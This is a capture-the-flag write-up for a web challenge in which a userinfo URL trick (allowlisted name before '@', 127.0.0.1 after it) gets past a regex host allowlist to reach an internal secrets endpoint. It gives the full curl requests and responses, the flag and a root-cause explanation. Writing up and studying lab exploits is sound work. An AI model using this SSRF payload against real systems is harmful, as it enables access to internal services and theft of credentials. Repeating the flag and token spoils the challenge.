# Aid Agency Mirror — Writeup

**Challenge**: Aid Agency Mirror  
**Category**: Web / SSRF  
**Flag**: `SDG{cd3c051a360c46603aae44259f890f23}`

---

## Overview

The Aid Agency Mirror is a supplier health checker that enforces an allowlist of partner hostnames. The hostname validation uses a naive regex-based extractor, while the actual HTTP fetch uses a proper URL parser. These two disagree on URLs containing **userinfo** (the `user:password@` portion before the host), creating an SSRF bypass.

The objective is to reach the internal credentials vault at `/internal/secrets` and extract the audit token.

```
API endpoint:
https://hackforachangeruntime.vercel.app/api/aid-agency-mirror?seed=639a23549ddd957ca007e9921bd52d8df77dda280b188d6602cd207b9333c345
```

---

## Step 1 — Reconnaissance: Fetch Service Info

The challenge UI has a "GET service info" button. We query the API with `action=info`:

```bash
curl "https://hackforachangeruntime.vercel.app/api/aid-agency-mirror?seed=639a23549ddd957ca007e9921bd52d8df77dda280b188d6602cd207b9333c345&action=info"
```

Response:

```json
{
  "ok": true,
  "system": "AidAgency Supplier Mirror v1.0",
  "program": "SDG 1 — Supplier Network Health",
  "endpoints": {
    "fetch": "POST ?action=fetch {\"url\": \"<http(s) URL>\"}"
  },
  "allowlist": [
    "supplier-a.example",
    "supplier-b.example",
    "partner-relief.example"
  ],
  "note": "Only allowlisted supplier hostnames are reachable. Internal services (127.0.0.1/internal/*) are firewalled off from the public surface."
}
```

Three allowed hosts: `supplier-a.example`, `supplier-b.example`, `partner-relief.example`.

---

## Step 2 — Understanding the Vulnerability

From the hints:

> *The validator and the fetcher disagree on what "host" means in a URL with userinfo.*
> *RFC 3986: everything before the `@` is userinfo, everything after is host. Many naive parsers split on `@` and keep the left.*

The URL `http://supplier-a.example@127.0.0.1/path` is interpreted differently:

| Parser | Extracted "host" | How it works |
|---|---|---|
| **Naive regex validator** | `supplier-a.example` | Splits on `@`, takes the left portion |
| **Proper URL parser** | `127.0.0.1` | Per RFC 3986: everything before `@` is userinfo, everything after is the actual host |

This disagreement lets us smuggle an internal address past the allowlist check while the real fetch targets `127.0.0.1`.

---

## Step 3 — Exploit: Userinfo SSRF Bypass

We POST a URL containing an allowlisted hostname in the userinfo position, with the real target (`127.0.0.1`) as the actual host:

```bash
curl -X POST "https://hackforachangeruntime.vercel.app/api/aid-agency-mirror?seed=639a23549ddd957ca007e9921bd52d8df77dda280b188d6602cd207b9333c345&action=fetch" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://supplier-a.example@127.0.0.1/internal/secrets"}'
```

### URL Anatomy

```
http://supplier-a.example@127.0.0.1/internal/secrets
      ├── userinfo ──┘   └── host ──┘  └── path ──────┘
      └── validator sees this as the host
```

Response:

```json
{
  "ok": true,
  "target_url": "http://supplier-a.example@127.0.0.1/internal/secrets",
  "host_seen_by_validator": "supplier-a.example",
  "host_seen_by_fetcher": "127.0.0.1",
  "response_body": {
    "service": "credentials-vault",
    "audit_token": "25cf9dd86fe35e549b1a680462097eb5",
    "note": "Internal-only. Submit audit_token as proof to claim-runtime-flag."
  }
}
```

The validator accepted `supplier-a.example` as the host (passing the allowlist check), but the HTTP fetch went to `127.0.0.1/internal/secrets` and returned the **audit token**: `25cf9dd86fe35e549b1a680462097eb5`.

---

## Step 4 — Claim the Flag

The runtime JS reveals the claim endpoint:

```
POST https://vgwukffsjudbybdeuodn.supabase.co/functions/v1/claim-runtime-flag
Authorization: Bearer <launch_token>
Content-Type: application/json

{ "token": "<launch_token>", "proof": "<audit_token>", "slug": "aid-agency-mirror" }
```

```bash
curl -X POST "https://vgwukffsjudbybdeuodn.supabase.co/functions/v1/claim-runtime-flag" \
  -H "Authorization: Bearer eyJ..." \
  -H "Content-Type: application/json" \
  -d '{"token":"eyJ...","proof":"25cf9dd86fe35e549b1a680462097eb5","slug":"aid-agency-mirror"}'
```

Response:

```json
{
  "correct": true,
  "flag": "SDG{cd3c051a360c46603aae44259f890f23}"
}
```

---

## Summary

| Step | Action | Result |
|---|---|---|
| 1 | `GET ?action=info` | Revealed allowlist: `supplier-a.example`, `supplier-b.example`, `partner-relief.example` |
| 2 | Identify SSRF vector | Userinfo URL parsing disagreement (RFC 3986 vs naive regex) |
| 3 | `POST ?action=fetch {"url": "http://supplier-a.example@127.0.0.1/internal/secrets"}` | Bypassed allowlist, got audit token: `25cf9dd86fe35e549b1a680462097eb5` |
| 4 | Submit audit token to `claim-runtime-flag` | **`SDG{cd3c051a360c46603aae44259f890f23}`** |

### Root Cause

The server uses two different methods to extract the hostname from the URL:

1. **Validator**: A naive regex that searches for the first `@` and takes the left side as the "hostname":
   ```
   /http[s]?:\/\/([^@]+)@.*/  →  group 1 = "supplier-a.example"
   ```
2. **Fetcher**: A proper RFC 3986 URL parser that treats everything before `@` as userinfo and everything after as the true host:
   ```
   http://supplier-a.example@127.0.0.1/internal/secrets
   userinfo: supplier-a.example
   host:     127.0.0.1
   path:     /internal/secrets
   ```

This mismatch allows the attacker to embed any hostname in the userinfo field to pass the allowlist check while the fetcher resolves the actual target behind the `@` sign, enabling SSRF to internal endpoints.
